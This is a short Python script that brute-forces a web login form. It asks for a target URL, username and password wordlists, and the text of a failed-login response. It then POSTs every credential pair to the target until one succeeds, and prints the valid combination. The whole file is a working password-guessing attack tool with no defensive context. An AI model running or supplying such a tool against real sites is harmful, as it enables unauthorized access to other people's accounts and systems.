#!/bin/python3

import requests
import sys
# Iterates over each list that it fed to the function
# Attempts to sumbit a post form for each username password combination
###############################################
def web_brute_force(url,unames,passwrds,needle):
    for name in unames:
        for password in passwrds:
            sys.stdout.write(f"[X]Attempting -> {name}:{password}\r")
            sys.stdout.flush()
            # print(f"{name}:{password}")
            r = requests.post(url, data={"username": name, "password": password})
            if needle.encode() not in r.content:
                sys.stdout.write('\n')
                sys.stdout.write(f'\t[>>>>>] Valid username:password combination -> {name}:{password}')
                sys.exit()
            sys.stdout.flush()
            sys.stdout.write('\n')
            sys.stdout.write('\tNo password found\n')
###############################################


# This gets the lists that are fed from user input
# opens the text file, creates a list out of it
# and then turns it into a list to be iterated over 
################################################
def get_list(a_list):
    final_list = []
    with open(f"{a_list}", 'r') as lst:
        for item in lst:
            item = item.strip()
            final_list.append(item)
    lst.close()
    return final_list
################################################

user_url = input("Please provide a target: ")
user_url = user_url.strip()
usernames = input("Please give me a username.txt file: ")
usernames = usernames.strip()
paswrd_list = input("Please give me a password.txt file: ")
paswrd_list = paswrd_list.strip()
needle = input("What is the invalid login response: ")
needle = needle.strip()

# This creates the lists that will be used to brute force the login form
################################################
get_list_uname = get_list(usernames)
get_list_pass = get_list(paswrd_list)
################################################

web_brute_force(user_url, get_list_uname, get_list_pass, needle)
